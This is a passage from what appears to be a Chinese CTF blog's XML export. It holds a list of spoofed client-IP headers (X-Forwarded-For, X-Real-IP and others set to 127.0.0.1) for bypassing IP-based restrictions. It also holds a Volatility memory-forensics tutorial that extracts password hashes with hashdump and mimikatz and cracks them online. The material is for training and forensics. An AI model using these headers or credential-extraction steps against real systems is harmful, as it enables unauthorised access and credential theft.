class="attribute">Content-Type</span><span class="punctuation">: </span>message/http</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>166</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">TRACE</span> / HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: www.csdn.net</span></span><br><span class="line"><span class="language-apache"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win64; x64) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">84</span>.<span class="number">0</span>.<span class="number">4147</span>.<span class="number">125</span> Safar</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>伪造ip</title>
      <link href="/posts/c8350c89.html"/>
      <url>/posts/c8350c89.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/E4E031DFCC2307D704B826E01515BC05.png" alt="E4E031DFCC2307D704B826E01515BC05"></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">Forwarded-For:localhost</span></span><br><span class="line"></span><br><span class="line"><span class="section">Forwarded:127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">Forwarded:localhost</span></span><br><span class="line"></span><br><span class="line"><span class="section">True-Client-IP:127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">X-Client-IP:127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">X-Custom-IP-Authorization:127.0.0.1</span></span><br><span class="line"></span><br><span class="line">X-Forwarded-For：127.0.0.1</span><br><span class="line"></span><br><span class="line"><span class="section">X-Forward:127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">X-Forward:localhost</span></span><br><span class="line"></span><br><span class="line"><span class="section">X-Forwarded-Host:127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">X-Forwarded-Host:localhost</span></span><br><span class="line"></span><br><span class="line"><span class="section">X-HTTP-Host-Override:127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">X-Oriainatina-IP:127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">X-Forwarded-Host:127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">X-remote-IP:127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">X-remote-addr:127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">True-Client-IP:127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">Client-IP:127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">X-Real-IP:127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">Ali-CDN-Real-IP:127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">Cdn-Src-Ip:127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">Cdn-Real-Ip:127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">CF-Connecting-IP:127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">X-Cluster-Client-IP:127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">WL-Proxy-Client-IP:127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">Proxy-Client-IP:127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">Fastly-Client-Ip:127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">True-Client-Ip:127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="section">Host: 127.0.0.1</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>volayility工具的使用方法</title>
      <link href="/posts/bf034aea.html"/>
      <url>/posts/bf034aea.html</url>
      
        <content type="html"><![CDATA[<h2 id="volayility工具的使用方法"><a href="#volayility工具的使用方法" class="headerlink" title="volayility工具的使用方法"></a>volayility工具的使用方法</h2><h3 id="获取内存镜像详细信息"><a href="#获取内存镜像详细信息" class="headerlink" title="获取内存镜像详细信息"></a>获取内存镜像详细信息</h3><p>imageinfo 是 Volatility 中用于获取内存镜像信息的命令。它可以用于确定内存镜像的操作系统类型、版本、架构等信息，以及确定应该使用哪个插件进行内存分析</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python2</span> vol.py -f Challenge.raw imageinfo  <span class="comment">#f：指定分析的内存镜像文件名</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3422e6b9f4134545b38e28f440bf4b43.png" alt="img"></p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">上述输出中，Suggested Profile(s) 显示了 Volatility 推荐的几个内存镜像分析配置文件，可以根据这些配置文件来选择合适的插件进行内存分析</span><br><span class="line">AS Layer2 显示了使用的内存镜像文件路径</span><br><span class="line">KDBG 显示了内存镜像中的 KDBG 结构地址</span><br><span class="line">Number of Processors 显示了处理器数量</span><br><span class="line"><span class="built_in">Image</span> <span class="built_in">Type</span> 显示了操作系统服务包版本</span><br><span class="line"><span class="built_in">Image</span> <span class="built_in">date</span> <span class="built_in">and</span> <span class="built_in">time</span> 显示了内存镜像文件的创建日期和时间</span><br></pre></td></tr></table></figure><h3 id="获取正在运行的程序"><a href="#获取正在运行的程序" class="headerlink" title="获取正在运行的程序"></a>获取正在运行的程序</h3><p>这里我们用 Win7SP1x64 配置文件进行分析，Volatility 的 pslist 插件可以遍历内存镜像中的进程列表，显示每个进程的进程 ID、名称、父进程 ID、创建时间、退出时间和路径等信息</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol<span class="selector-class">.py</span> -f Challenge<span class="selector-class">.raw</span> <span class="attr">--profile</span>=Win7SP1x64 pslist</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/45abecfd68f44f519f29117157ed8202.png" alt="img"></p><h3 id="提取正在运行的程序"><a href="#提取正在运行的程序" class="headerlink" title="提取正在运行的程序"></a>提取正在运行的程序</h3><p>Volatility 的 procdump 插件可以根据进程 ID 或进程名称提取进程的内存映像，并保存为一个单独的文件</p><p>比如这里我要提取 iexplore.exe 这个程序</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/91b4b7d94a0941bb847d2ca1dd718e20.png" alt="img"></p><p>他的进程 pid 号为 2728</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.<span class="keyword">py</span> -<span class="keyword">f</span> Challenge.raw --<span class="keyword">profile</span>=Win7SP1x64 procdump -<span class="keyword">p</span> <span class="number">2728</span> -D ./</span><br><span class="line"><span class="keyword">p</span>：pid进程号</span><br><span class="line">D：提取程序后保存的地址，./指的是当前<span class="keyword">shell</span>正在运行的文件夹地址，输入<span class="keyword">pwd</span>命令可以查看<span class="keyword">shell</span>当前的地址，简单来说就是保存到当前文件夹</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/44983433c85949ea973d4a8847f83c80.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7cc5cb6ea5894a01af7d2f43b43c4e12.png" alt="img"></p><p>成功导出，导出后文件名为 executable.2728.exe</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/75235b0e2ab8468ba0d9bf89c226c2ec.png" alt="img"></p><h3 id="查看在终端里执行过的命令"><a href="#查看在终端里执行过的命令" class="headerlink" title="查看在终端里执行过的命令"></a>查看在终端里执行过的命令</h3><p>Volatility 的 cmdscan 插件可以扫描内存镜像中的进程对象，提取已执行的 cmd 命令，并将其显示在终端中</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol<span class="selector-class">.py</span> -f Challenge<span class="selector-class">.raw</span> <span class="attr">--profile</span>=Win7SP1x64 cmdscan</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1a294e3353534d53acfbc4d681935203.png" alt="img"></p><p>他移动到了 Documents 目录下，echo 了一次字符串，然后创建了一个名为 hint.txt 的文件</p><h3 id="查看进程在终端里运行的命令"><a href="#查看进程在终端里运行的命令" class="headerlink" title="查看进程在终端里运行的命令"></a>查看进程在终端里运行的命令</h3><p>Volatility 中的 cmdline 插件可以用于提取进程执行的命令行参数和参数值</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol<span class="selector-class">.py</span> -f Challenge<span class="selector-class">.raw</span> <span class="attr">--profile</span>=Win7SP1x64 cmdline</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/63133cffd6c6438d8dac28a7fdec6a33.png" alt="img"></p><h3 id="查找内存中的文件"><a href="#查找内存中的文件" class="headerlink" title="查找内存中的文件"></a>查找内存中的文件</h3><p>Volatility 的 filescan 插件可以在内存中搜索已经打开的文件句柄，从而获取文件名、路径、文件大小等信息</p><p>我想找到 hint.txt 文件，可以使用以下命令</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.<span class="keyword">py</span> -<span class="keyword">f</span> Challenge.raw --<span class="keyword">profile</span>=Win7SP1x64 filescan | <span class="keyword">grep</span> hint.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ae18212c27504c8886f86feb340466cc.png" alt="img"></p><p>grep 是 Linux 下常用的命令之一，它用于在文件中查找指定的字符串，并将包含该字符串的行输出</p><p>如果只使用 filescan 而不配合 grep 的话，Volatility 就会输出系统上的全部文件，例如：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6d3fc9ae14074b72b91684b01cbd91a2.png" alt="img"></p><h3 id="提取内存中的文件"><a href="#提取内存中的文件" class="headerlink" title="提取内存中的文件"></a>提取内存中的文件</h3><p>Volatility 的 dumpfiles 插件可以用来提取系统内存中的文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a780dec2b2984df5b323dee8912e744f.png" alt="img"></p><p>这里我要提取 hint.txt 文件，hint.txt 的内存位置为 0x000000011fd0ca70，这两个由于位置都一样，随便提取哪个都行</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python2 vol.<span class="keyword">py</span> -<span class="keyword">f</span> Challenge.raw --<span class="keyword">profile</span>=Win7SP1x64 dumpfiles -Q <span class="number">0</span>x000000011fd0ca70 -D ./</span><br><span class="line">Q：内存位置</span><br><span class="line">D：提取程序后保存的地址，./指的是当前<span class="keyword">shell</span>正在运行的文件夹地址，输入<span class="keyword">pwd</span>命令可以查看<span class="keyword">shell</span>当前的地址，简单来说就是保存到当前文件夹</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/535675245dd846e9a588e036ab6c4428.png" alt="img"></p><p>提取出来的文件名是包含内存地址的，更改一下后缀名即可运行</p><h3 id="查看浏览器历史记录"><a href="#查看浏览器历史记录" class="headerlink" title="查看浏览器历史记录"></a>查看浏览器历史记录</h3><p>Volatility 中的 iehistory 插件可以用于提取 Internet Explorer 浏览器历史记录</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol<span class="selector-class">.py</span> -f Challenge<span class="selector-class">.raw</span> <span class="attr">--profile</span>=Win7SP1x64 iehistory</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a232c42576c74dfca9c3879eddd1ba5b.png" alt="img"></p><h3 id="提取用户密码-hash-值并爆破"><a href="#提取用户密码-hash-值并爆破" class="headerlink" title="提取用户密码 hash 值并爆破"></a>提取用户密码 hash 值并爆破</h3><p>Volatility 中的 Hashdump 插件可以用于提取系统内存中的密码哈希值</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol<span class="selector-class">.py</span> -f Challenge<span class="selector-class">.raw</span> <span class="attr">--profile</span>=Win7SP1x64 hashdump</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7936d30ef7bd47739846e8c717da9af5.png" alt="img"></p><p>这里提取了四个用户的密码 hash 值，我们将这些字符串复制一下，粘贴到本地本文里</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a1de0d61b1c5411fb5307512a86d050d.png" alt="img"></p><p>我们可以使用这个在线网站：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//crackstation.net/</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2f67c4a94399411c8ebae5afe0ed8cef.png" alt="img"></p><p>将 hash 值粘贴上去</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a2a920a2960b445d9bd1aed994ab0903.png" alt="img"></p><p>就可以得到用户密码明文</p><h3 id="使用-mimikatz-提取密码"><a href="#使用-mimikatz-提取密码" class="headerlink" title="使用 mimikatz 提取密码"></a>使用 mimikatz 提取密码</h3><p>mimikatz 是一个开源的用于从 Windows 操作系统中提取明文密码，哈希值以及其他安全凭据的工具</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol<span class="selector-class">.py</span> -f Challenge<span class="selector-class">.raw</span> <span class="attr">--profile</span>=Win7SP1x64 mimikatz</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/efc11fc02f9b4ef5990e72c614ce0e03.png" alt="img"></p><p>成功提取到 TroubleMaker 用户的密码</p><h3 id="查看剪切板里的内容"><a href="#查看剪切板里的内容" class="headerlink" title="查看剪切板里的内容"></a>查看剪切板里的内容</h3><p>Volatility 中的 clipboard 插件可以用于从内存转储中提取剪贴板数据</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol<span class="selector-class">.py</span> -f Challenge<span class="selector-class">.raw</span> <span class="attr">--profile</span>=Win7SP1x64 clipboard</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/29ae5ed5721449be99d7bd02a63b30e8.png" alt="img"></p><h3 id="查看正在运行的服务"><a href="#查看正在运行的服务" class="headerlink" title="查看正在运行的服务"></a>查看正在运行的服务</h3><p>svcscan 是 Volatility 中的一个插件，用于扫描进程中所有的服务</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">svcscan</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/402e4071e224454ba767e7f648382c3b.png" alt="img"></p><p>执行了 svcscan 之后，每列代表服务的一些信息，包括服务名、PID、服务状态、服务类型、路径等等</p><h3 id="查看网络连接状态"><a href="#查看网络连接状态" class="headerlink" title="查看网络连接状态"></a>查看网络连接状态</h3><p>Volatility 中的 netscan 插件可以在内存转储中查找打开的网络连接和套接字，该命令将显示所有当前打开的网络连接和套接字。输出包括本地和远程地址、端口、进程 ID 和进程名称等信息</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol<span class="selector-class">.py</span> -f Challenge<span class="selector-class">.raw</span> <span class="attr">--profile</span>=Win7SP1x64 netscan</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/902b4ff077424d839920315f41516242.png" alt="img"></p><h3 id="查看注册表信息"><a href="#查看注册表信息" class="headerlink" title="查看注册表信息"></a>查看注册表信息</h3><p>printkey 是 Volatility 工具中用于查看注册表的插件之一。它可以帮助分析人员查看和解析注册表中的键值，并提供有关键值的详细信息，如名称、数据类型、大小和值等</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol<span class="selector-class">.py</span> -f Challenge<span class="selector-class">.raw</span> <span class="attr">--profile</span>=Win7SP1x64 printkey</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b78477c28c3d4013a6339b5c7440c90e.png" alt="img"></p><p>然后使用 hivelist 插件来确定注册表的地址</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol<span class="selector-class">.py</span> -f Challenge<span class="selector-class">.raw</span> <span class="attr">--profile</span>=Win7SP1x64 hivelist</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/dee0917b8cd04757b7574753e848d77b.png" alt="img"></p><p>查看注册表 software 项</p><p>hivedump 是一个 Volatility 插件，用于从内存中提取 Windows 注册表的内容，这里我们选择第一个来演示</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 vol<span class="selector-class">.py</span> -f Challenge<span class="selector-class">.raw</span> <span class="attr">--profile</span>=Win7SP1x64 hivedump -o <span class="number">0</span>xfffff8a00127d010</span><br><span class="line">o：hivelist列出的Virtual值</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/471fb2976a1e4fdcbb239c4d528dde9b.png" alt="img"></p><p>根据名称查看具体子项的内容，这里以 SAM\Domains\Account\Users\Names 做演示，这个是 Windows 系统中存储本地用户账户信息的注册表路径，它包含了每个本地用户账户的名称和对应的 SID 信息</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol<span class="selector-class">.py</span> -f Challenge<span class="selector-class">.raw</span> <span class="attr">--profile</span>=Win7SP1x64 printkey -K <span class="string">&quot;SAM\Domains\Account\Users\Names&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/abf787f806634700b013b8583bfaab5b.png" alt="img"></p><p>如果要提取全部的注册表，可以用这个命令</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 vol<span class="selector-class">.py</span> -f Challenge<span class="selector-class">.raw</span> <span class="attr">--profile</span>=Win7SP1x64 dumpregistry -D ./</span><br></pre></td></tr></table></figure><h3 id="全部插件"><a href="#全部插件" class="headerlink" title="全部插件"></a>全部插件</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">amcache         查看AmCache应用程序痕迹信息</span><br><span class="line">apihooks        检测内核及进程的内存空间中的API hook</span><br><span class="line">atoms           列出会话及窗口站atom表</span><br><span class="line">atomscan        Atom表的池扫描(Pool scanner)</span><br><span class="line">auditpol        列出注册表HKLMSECURITYPolicyPolAdtEv的审计策略信息</span><br><span class="line">bigpools        使用BigPagePoolScanner转储大分页池(big page pools)</span><br><span class="line">bioskbd         从实时模式内存中读取键盘缓冲数据(早期电脑可以读取出BIOS开机密码)</span><br><span class="line">cachedump       获取内存中缓存的域帐号的密码哈希</span><br><span class="line">callbacks       打印全系统通知例程</span><br><span class="line">clipboard       提取Windows剪贴板中的内容</span><br><span class="line">cmdline         显示进程命令行参数</span><br><span class="line">cmdscan         提取执行的命令行历史记录（扫描<span class="variable">_COMMAND_HISTORY</span>信息）</span><br><span class="line">connections     打印系统打开的网络连接(仅支持Windows XP 和<span class="number">2003</span>)</span><br><span class="line">connscan        打印TCP连接信息</span><br><span class="line">consoles        提取执行的命令行历史记录（扫描<span class="variable">_CONSOLE_INFORMATION</span>信息）</span><br><span class="line">crashinfo       提取崩溃转储信息</span><br><span class="line">deskscan        tagDESKTOP池扫描(Poolscaner)</span><br><span class="line">devicetree      显示设备树信息</span><br><span class="line">dlldump         从进程地址空间转储动态链接库</span><br><span class="line">dlllist         打印每个进程加载的动态链接库列表</span><br><span class="line">driverirp       IRP hook驱动检测</span><br><span class="line">drivermodule    关联驱动对象至内核模块</span><br><span class="line">driverscan      驱动对象池扫描</span><br><span class="line">dumpcerts       提取RAS私钥及SSL公钥</span><br><span class="line">dumpfiles       提取内存中映射或缓存的文件</span><br><span class="line">dumpregistry    转储内存中注册表信息至磁盘</span><br><span class="line">editbox         查看Edit编辑控件信息 (Listbox正在实验中)</span><br><span class="line">envars          显示进程的环境变量</span><br><span class="line">eventhooks      打印Windows事件hook详细信息</span><br><span class="line">evtlogs         提取Windows事件日志（仅支持XP/<span class="number">2003</span>)</span><br><span class="line">filescan        提取文件对象（file objects）池信息</span><br><span class="line">gahti           转储用户句柄（handle）类型信息</span><br><span class="line">gditimers       打印已安装的GDI计时器(timers)及回调(callbacks)</span><br><span class="line">gdt             显示全局描述符表(Global Deor Table)</span><br><span class="line">getservicesids  获取注册表中的服务名称并返回SID信息</span><br><span class="line">getsids         打印每个进程的SID信息</span><br><span class="line">handles         打印每个进程打开的句柄的列表</span><br><span class="line">hashdump        转储内存中的Windows帐户密码哈希(LM/NTLM)</span><br><span class="line">hibinfo         转储休眠文件信息</span><br><span class="line">hivedump        打印注册表配置单元信息</span><br><span class="line">hivelist        打印注册表配置单元列表</span><br><span class="line">hivescan        注册表配置单元池扫描</span><br><span class="line">hpakextract     从HPAK文件（Fast Dump格式）提取物理内存数据</span><br><span class="line">hpakinfo        查看HPAK文件属性及相关信息</span><br><span class="line">idt             显示中断描述符表(Interrupt Deor Table)</span><br><span class="line">iehistory       重建IE缓存及访问历史记录</span><br><span class="line">imagecopy       将物理地址空间导出原生DD镜像文件</span><br><span class="line">imageinfo       查看/识别镜像信息</span><br><span class="line">impscan         扫描对导入函数的调用</span><br><span class="line">joblinks        打印进程任务链接信息</span><br><span class="line">kdbgscan        搜索和转储潜在KDBG值</span><br><span class="line">kpcrscan        搜索和转储潜在KPCR值</span><br><span class="line">ldrmodules      检测未链接的动态链接DLL</span><br><span class="line">lsadump         从注册表中提取LSA密钥信息（已解密）</span><br><span class="line">machoinfo       转储Mach-O 文件格式信息</span><br><span class="line">malfind         查找隐藏的和插入的代码</span><br><span class="line">mbrparser       扫描并解析潜在的主引导记录(MBR)</span><br><span class="line">memdump         转储进程的可寻址内存</span><br><span class="line">memmap          打印内存映射</span><br><span class="line">messagehooks    桌面和窗口消息钩子的线程列表</span><br><span class="line">mftparser       扫描并解析潜在的MFT条目</span><br><span class="line">moddump         转储内核驱动程序到可执行文件的示例</span><br><span class="line">modscan         内核模块池扫描</span><br><span class="line">modules         打印加载模块的列表</span><br><span class="line">multiscan       批量扫描各种对象</span><br><span class="line">mutantscan      对互斥对象池扫描</span><br><span class="line">notepad         查看记事本当前显示的文本</span><br><span class="line">objtypescan     扫描窗口对象类型对象</span><br><span class="line">patcher         基于页面扫描的补丁程序内存</span><br><span class="line">poolpeek        可配置的池扫描器插件</span><br><span class="line">printkey        打印注册表项及其子项和值</span><br><span class="line">privs           显示进程权限</span><br><span class="line">procdump        进程转储到一个可执行文件示例</span><br><span class="line">pslist          按照EPROCESS列表打印所有正在运行的进程</span><br><span class="line">psscan          进程对象池扫描</span><br><span class="line">pstree          以树型方式打印进程列表</span><br><span class="line">psxview         查找带有隐藏进程的所有进程列表</span><br><span class="line">qemuinfo        转储 Qemu 信息</span><br><span class="line">raw2dmp         将物理内存原生数据转换为windbg崩溃转储格式</span><br><span class="line"><span class="built_in">screenshot</span>      基于GDI Windows的虚拟屏幕截图保存</span><br><span class="line">servicediff     Windows服务列表(ala Plugx)</span><br><span class="line">sessions        <span class="variable">_MM_SESSION_SPACE</span>的详细信息列表(用户登录会话)</span><br><span class="line">shellbags       打印Shellbags信息</span><br><span class="line">shimcache       解析应用程序兼容性Shim缓存注册表项</span><br><span class="line">shutdowntime    从内存中的注册表信息获取机器关机时间</span><br><span class="line">sockets         打印已打开套接字列表</span><br><span class="line">sockscan        TCP套接字对象池扫描</span><br><span class="line">ssdt            显示SSDT条目</span><br><span class="line">strings         物理到虚拟地址的偏移匹配(需要一些时间，带详细信息)</span><br><span class="line">svcscan         Windows服务列表扫描</span><br><span class="line">symlinkscan     符号链接对象池扫描</span><br><span class="line">thrdscan        线程对象池扫描</span><br><span class="line">threads         调查<span class="variable">_ETHREAD</span> 和<span class="variable">_KTHREADs</span></span><br><span class="line">timeliner       创建内存中的各种痕迹信息的时间线</span><br><span class="line">timers          打印内核计时器及关联模块的DPC</span><br><span class="line">truecryptmaster Recover     恢复TrueCrypt <span class="number">7.1</span>a主密钥</span><br><span class="line">truecryptpassphrase     查找并提取TrueCrypt密码</span><br><span class="line">truecryptsummary    TrueCrypt摘要信息</span><br><span class="line">unloadedmodules 打印卸载的模块信息列表</span><br><span class="line">userassist      打印注册表中UserAssist相关信息</span><br><span class="line">userhandles     转储用户句柄表</span><br><span class="line">vaddump         转储VAD数据为文件</span><br><span class="line">vadinfo         转储VAD信息</span><br><span class="line">vadtree         以树形方式显示VAD树信息</span><br><span class="line">vadwalk         